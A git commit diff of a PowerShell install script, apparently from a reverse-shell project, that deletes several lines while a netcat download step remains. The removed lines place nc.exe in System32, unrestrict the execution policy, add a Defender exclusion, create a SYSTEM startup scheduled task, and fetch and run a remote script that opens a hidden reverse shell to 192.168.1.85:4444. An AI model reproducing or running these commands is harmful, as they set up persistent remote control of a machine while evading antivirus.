e5feb4a595fa921090ff1cf3f63ff7f2d3a54d66
bjrumplee <130537869+bjrumplee@users.noreply.github.com>
2023-05-05 15:42:08 -0700

    Update install.ps1

--- install.ps1
+++ install.ps1
@@ -10,9 +10,3 @@ try {
     Write-Host "Error downloading netcat.zip: $_"
 }
 
-Expand-Archive -Path 'C:\Temp\netcat.zip' -DestinationPath 'C:\Temp\netcat' -Force
-Move-Item -Path 'C:\Temp\netcat\nc.exe' -Destination 'C:\Windows\System32' -Force
-Set-ExecutionPolicy Unrestricted -Force
-Add-MpPreference -ExclusionPath "C:\Temp\restart.ps1"
-schtasks /create /tn "Restart" /tr "'powershell.exe' '-ExecutionPolicy Bypass' '-File C:\Temp\restart.ps1'" /sc onstart /ru system /f
-powershell -NoProfile -WindowStyle Hidden -Command "IEX (IWR 'https://raw.githubusercontent.com/bjrumplee/ncatreverseshell/main/reverse.ps1' -UseBasicParsing); Invoke-ConPtyShell '192.168.1.85' '4444'"
